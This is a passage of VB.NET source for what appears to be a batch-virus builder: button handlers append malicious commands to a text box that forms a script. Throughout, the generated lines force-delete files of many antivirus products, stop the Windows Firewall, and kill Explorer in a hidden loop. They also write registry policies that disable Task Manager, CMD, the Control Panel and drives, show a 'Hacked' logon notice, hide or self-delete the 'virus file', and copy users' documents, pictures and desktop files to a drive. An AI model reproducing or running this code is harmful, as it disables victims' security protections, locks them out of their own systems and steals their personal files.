        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\avpersonal\*.vdf "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\Norton~1\*.cnt "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\Mcafee\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\avpersonal\*.vdf "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\Norton~1\*.cnt "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\Mcafee\*.*"
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\Norton~1\Norton~1\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\Norton~1\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\Norton~1\Norton~1\Norton~3\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\Norton~1\Norton~1\speedd~1\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\Norton~1\Norton~1\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\Norton~1\*.* "
        RichTextBox1.Text += Environment.NewLine + "  cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\avgamsr\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\avgamsvr\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\avgemc\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\avgamsr\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\avgamsvr\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\avgemc\*.exe "
        RichTextBox1.Text += Environment.NewLine + "        cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\avgcc\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\avgupsvc\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\grisoft "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\nood32krn\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\nood32\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\avgcc\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\avgupsvc\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\grisoft "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\nood32krn\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\nood32\*.exe "
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\nod32 "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\nood32"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\kav\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\kavmm\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\kaspersky\*.*"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\nod32 "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\nood32"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\kav\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\kavmm\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\kaspersky\*.*"
        RichTextBox1.Text += Environment.NewLine + "       cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\ewidoctrl\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\guard\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\ewido\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\ewidoctrl\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\guard\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\ewido\*.exe "
        RichTextBox1.Text += Environment.NewLine + "      cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\pavprsrv\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\pavprot\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\avengine\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\pavprsrv\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\pavprot\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\avengine\*.exe "
        RichTextBox1.Text += Environment.NewLine + "  cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\apvxdwin\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\webproxy\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\panda software\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\apvxdwin\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\webproxy\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\panda software\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\AVAST Software\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\AVAST Software\AvastUI.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\AVAST Software\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\AVAST Software\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\AVAST Software\AvastUI.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\AVAST Software\*.* "
        RichTextBox1.Text += Environment.NewLine + "  cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\avast\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\avast\AvastUI.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\avast\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\avast\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\avast\AvastUI.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\avast\*.* "
        RichTextBox1.Text += Environment.NewLine + "  cls()"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\Malwarebytes Anti-Malware\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\Malwarebytes Anti-Malware\Configuration"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files (x86)\Malwarebytes Anti-Malware\*.* "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\Malwarebytes Anti-Malware\*.exe "
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\Malwarebytes Anti-Malware\Configuration"
        RichTextBox1.Text += Environment.NewLine + "del /Q /F C:\Program Files\Malwarebytes Anti-Malware\*.* "
        RichTextBox1.Text += Environment.NewLine + "  REM ---------------------------------"

    End Sub

    Private Sub Button41_Click(sender As Object, e As EventArgs) Handles Button41.Click
        If (CheckedListBox3.GetItemChecked(CheckedListBox3.Items.IndexOf("Notepad"))) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Kill Notepad"
            RichTextBox1.Text += Environment.NewLine + "tskill notepad"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
        If (CheckedListBox3.GetItemChecked(CheckedListBox3.Items.IndexOf("Word"))) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Kill Word"
            RichTextBox1.Text += Environment.NewLine + "tskill WINWORD"
            RichTextBox1.Text += Environment.NewLine + " REM ---------------------------------"
        End If
        If (CheckedListBox3.GetItemChecked(CheckedListBox3.Items.IndexOf("Excel"))) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Kill Excel"
            RichTextBox1.Text += Environment.NewLine + "tskill excel"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
        If (CheckedListBox3.GetItemChecked(CheckedListBox3.Items.IndexOf("Calculator"))) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Kill Calculator"
            RichTextBox1.Text += Environment.NewLine + "tskill calc"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
        If (CheckedListBox3.GetItemChecked(CheckedListBox3.Items.IndexOf("Paint"))) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Kill Paint"
            RichTextBox1.Text += Environment.NewLine + "tskill mspaint"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
        If (CheckedListBox3.GetItemChecked(CheckedListBox3.Items.IndexOf("Access"))) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Kill Access"
            RichTextBox1.Text += Environment.NewLine + "tskill msaccess"
            RichTextBox1.Text += Environment.NewLine + " REM ---------------------------------"
        End If
        If (CheckedListBox3.GetItemChecked(CheckedListBox3.Items.IndexOf("Inte.Explorer"))) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Kill Internet Explorer"
            RichTextBox1.Text += Environment.NewLine + "tskill iexplore"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
        If (CheckedListBox3.GetItemChecked(CheckedListBox3.Items.IndexOf("Explorer"))) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Kill Explorer"
            RichTextBox1.Text += Environment.NewLine + "echo :a >>explorer.bat"
            RichTextBox1.Text += Environment.NewLine + "echo :a >>explorer.batecho tskill explorer >>explorer.bat"
            RichTextBox1.Text += Environment.NewLine + "echo Set objShell = CreateObject(""WScript.Shell"")>>invisi.vbs"
            RichTextBox1.Text += Environment.NewLine + "echo strCommand = ""explorer.bat"">>invisi.vbs"
            RichTextBox1.Text += Environment.NewLine + "echo objShell.Run strCommand, vbHide, TRUE>>invisi.vbs"
            RichTextBox1.Text += Environment.NewLine + "echo :a >>explorer.bat"
            RichTextBox1.Text += Environment.NewLine + "start """" invisi.vbs"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
    End Sub

    Private Sub Button42_Click_1(sender As Object, e As EventArgs) Handles Button42.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Kill "
        RichTextBox1.Text += (TextBox4.Text)
        RichTextBox1.Text += Environment.NewLine + "tskill "
        RichTextBox1.Text += (TextBox4.Text)
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button43_Click(sender As Object, e As EventArgs) Handles Button43.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Kill Windows Firewall"
        RichTextBox1.Text += Environment.NewLine + "net stop MpsSvc"
        RichTextBox1.Text += Environment.NewLine + "taskkill /f /t /im FirewallControlPanel.exe"
        RichTextBox1.Text += Environment.NewLine + "netsh firewall set opmode disable"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button44_Click(sender As Object, e As EventArgs) Handles Button44.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Kill System Resources"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoToolbarsOnTaskbar /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSetTaskBar /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoTrayContextMenu /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuMorePrograms /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSetFolders /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSecurityTab /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoLogOff /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFind /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDrives /t REG_DWORD /d 03ffffff"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoNetHood /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoNetworkConnections /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v StartMenuLogOff /t REG_DWORD /d 00000000"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v ClassicShell /t REG_DWORD /d 00000000"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSMMyDocs /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSMHelp /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSMConfigurePrograms /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuMyMusic /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSMMyPictures /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRecentDocsMenu /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFavoritesMenu /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuPinnedList /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoActiveDesktop /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoTrayItemsDisplay /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableLockWorkstation /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v NoDispCPL /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v NoDispBackgroundPage /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v NoDispScrSavPage /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v NoDispAppearancePage /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v NoDispSettingsPage /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 00000002"
        RichTextBox1.Text += Environment.NewLine + "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v legalnoticecaption /d Oops.."
        RichTextBox1.Text += Environment.NewLine + "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v legalnoticetext /d ...Hacked..."
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Policies\Microsoft\MMC /v RestrictToPermittedSnapins /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Start_ShowPrinters /t REG_DWORD /d 00000000"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Start_AdminToolsRoot /t REG_DWORD /d 00000000"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Start_ShowMyComputer /t REG_DWORD /d 00000000"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v WebView /t REG_DWORD /d 00000000"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Uninstall /v NoAddRemovePrograms /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Uninstall /v NoAddPage /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Uninstall /v NoRemovePage /t REG_DWORD /d 00000001"
        RichTextBox1.Text += Environment.NewLine + "reg add HKCU\Control Panel\International /v sTimeFormat /d H:mm:ss"
        RichTextBox1.Text += Environment.NewLine + "reg add HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v WebView /t REG_DWORD /d 00000000"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub CheckedListBox3_SelectedIndexChanged(sender As Object, e As EventArgs) Handles CheckedListBox3.SelectedIndexChanged
        Dim idx, sidx As Integer
        sidx = CheckedListBox3.SelectedIndex
        For idx = 0 To CheckedListBox3.Items.Count - 1
            If idx <> sidx Then
                CheckedListBox3.SetItemChecked(idx, False)
            Else
                CheckedListBox3.SetItemChecked(sidx, True)
            End If
        Next
    End Sub

    Private Sub Button45_Click(sender As Object, e As EventArgs) Handles Button45.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Hide Virus File After Run"
        RichTextBox1.Text += Environment.NewLine + "attrib +h %0"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button46_Click(sender As Object, e As EventArgs) Handles Button46.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Self Destruct"
        RichTextBox1.Text += Environment.NewLine + "del /f /q %0"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button47_Click(sender As Object, e As EventArgs) Handles Button47.Click
        Dim result As Integer = MessageBox.Show("The Name Would Be set as a default (""WXE"")," + Environment.NewLine + "Continue?", "Infromation", MessageBoxButtons.YesNo, MessageBoxIcon.Information)
        If result = DialogResult.No Then
            MessageBox.Show("Script Operation Cancelled")
        ElseIf result = DialogResult.Yes Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Hide CMD Window"
            RichTextBox1.Text += Environment.NewLine + "if exist winstart.vbs goto next"
            RichTextBox1.Text += Environment.NewLine + "echo set objShell = CreateObject(""WScript.Shell"") >> winstart.vbs"
            RichTextBox1.Text += Environment.NewLine + "echo objShell.Run ""WXE.bat"", vbHide, TRUE >> winstart.vbs"
            RichTextBox1.Text += Environment.NewLine + "start """" ""winstart.vbs"""
            RichTextBox1.Text += Environment.NewLine + "exit"
            RichTextBox1.Text += Environment.NewLine + ":next"
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
    End Sub

    Private Sub Button48_Click(sender As Object, e As EventArgs) Handles Button48.Click
        If CheckedListBox4.GetItemChecked(CheckedListBox4.Items.IndexOf("My Documents")) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Copy My Documents"
            RichTextBox1.Text += Environment.NewLine + "SET odrive=%odrive:~0,2%"
            RichTextBox1.Text += Environment.NewLine + "set backupcmd=xcopy /s /c /d /e /h /i /r /y"
            RichTextBox1.Text += Environment.NewLine + "echo on"
            RichTextBox1.Text += Environment.NewLine + "%backupcmd% ""%USERPROFILE%\Documents"" ""%drive%\all\My Docs"""
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
        If CheckedListBox4.GetItemChecked(CheckedListBox4.Items.IndexOf("My Downloads")) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Copy My Downloads"
            RichTextBox1.Text += Environment.NewLine + "SET odrive=%odrive:~0,2%"
            RichTextBox1.Text += Environment.NewLine + "set backupcmd=xcopy /s /c /d /e /h /i /r /y"
            RichTextBox1.Text += Environment.NewLine + "echo on"
            RichTextBox1.Text += Environment.NewLine + "%backupcmd% ""%USERPROFILE%\Downloads"" ""%drive%\all\My Downloads"""
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
        If CheckedListBox4.GetItemChecked(CheckedListBox4.Items.IndexOf("My Pictures")) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Copy My Pictures"
            RichTextBox1.Text += Environment.NewLine + "SET odrive=%odrive:~0,2%"
            RichTextBox1.Text += Environment.NewLine + "set backupcmd=xcopy /s /c /d /e /h /i /r /y"
            RichTextBox1.Text += Environment.NewLine + "echo on"
            RichTextBox1.Text += Environment.NewLine + "%backupcmd% ""%USERPROFILE%\Pictures"" ""%drive%\all\My Pics"""
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
        If CheckedListBox4.GetItemChecked(CheckedListBox4.Items.IndexOf("My Music")) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Copy My Music"
            RichTextBox1.Text += Environment.NewLine + "SET odrive=%odrive:~0,2%"
            RichTextBox1.Text += Environment.NewLine + "set backupcmd=xcopy /s /c /d /e /h /i /r /y"
            RichTextBox1.Text += Environment.NewLine + "echo on"
            RichTextBox1.Text += Environment.NewLine + "%backupcmd% ""%USERPROFILE%\Music"" ""%drive%\all\My Music"""
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
        If CheckedListBox4.GetItemChecked(CheckedListBox4.Items.IndexOf("My Videos")) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Copy My Videos"
            RichTextBox1.Text += Environment.NewLine + "SET odrive=%odrive:~0,2%"
            RichTextBox1.Text += Environment.NewLine + "set backupcmd=xcopy /s /c /d /e /h /i /r /y"
            RichTextBox1.Text += Environment.NewLine + "echo on"
            RichTextBox1.Text += Environment.NewLine + "%backupcmd% ""%USERPROFILE%\Videos"" ""%drive%\all\My Vids"""
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
        If CheckedListBox4.GetItemChecked(CheckedListBox4.Items.IndexOf("Desktop")) Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Copy Desktop Files"
            RichTextBox1.Text += Environment.NewLine + "SET odrive=%odrive:~0,2%"
            RichTextBox1.Text += Environment.NewLine + "set backupcmd=xcopy /s /c /d /e /h /i /r /y"
            RichTextBox1.Text += Environment.NewLine + "echo on"
            RichTextBox1.Text += Environment.NewLine + "%backupcmd% ""%USERPROFILE%\Desktop"" ""%drive%\all\Desktop"""
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        End If
    End Sub

    Private Sub CheckedListBox4_SelectedIndexChanged(sender As Object, e As EventArgs) Handles CheckedListBox4.SelectedIndexChanged
        Dim idx, sidx As Integer
        sidx = CheckedListBox4.SelectedIndex
        For idx = 0 To CheckedListBox4.Items.Count - 1
            If idx <> sidx Then
                CheckedListBox4.SetItemChecked(idx, False)
            Else
                CheckedListBox4.SetItemChecked(sidx, True)
            End If
        Next
    End Sub

    Private Sub Button49_Click(sender As Object, e As EventArgs) Handles Button49.Click
        If CheckBox8.Checked = True Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Copy File or Folders"
            RichTextBox1.Text += Environment.NewLine + "SET odrive=%odrive:~0,2%"
            RichTextBox1.Text += Environment.NewLine + "for %%d in (c d e f g h i j k l m n o p q r s t u v w x y z) do ("
            RichTextBox1.Text += Environment.NewLine + "xcopy /s /c /d /e /h /i /r /y ""%%d:\"
            RichTextBox1.Text += TextBox5.Text
            RichTextBox1.Text += """ ""%drive%\all\Copy"" 2>nul && GoTo :break)"
            RichTextBox1.Text += Environment.NewLine + " rem ---------------------------------"
        End If
        If CheckBox7.Checked = True Then
            RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
            RichTextBox1.Text += Environment.NewLine + "rem Copy By Path Name"
            RichTextBox1.Text += Environment.NewLine + "SET odrive=%odrive:~0,2%"
            RichTextBox1.Text += Environment.NewLine + "xcopy /s /c /d /e /h /i /r /y """
            RichTextBox1.Text += TextBox5.Text
            RichTextBox1.Text += """ ""%drive%\all\Copy"" 2>nul"
            RichTextBox1.Text += Environment.NewLine + "GoTo :break"
            RichTextBox1.Text += Environment.NewLine + " rem ---------------------------------"
        End If
    End Sub

    Private Sub CheckBox8_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox8.CheckedChanged
        If CheckBox8.Checked = True Then
            TextBox5.Enabled = True
            TextBox5.Text = "eg: WX3.exe or \P.....\..... or me*"
            CheckBox7.Checked = False
        Else
            TextBox5.Enabled = False
        End If
    End Sub

    Private Sub CheckBox7_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox7.CheckedChanged
        If CheckBox7.Checked = True Then
            TextBox5.Enabled = True
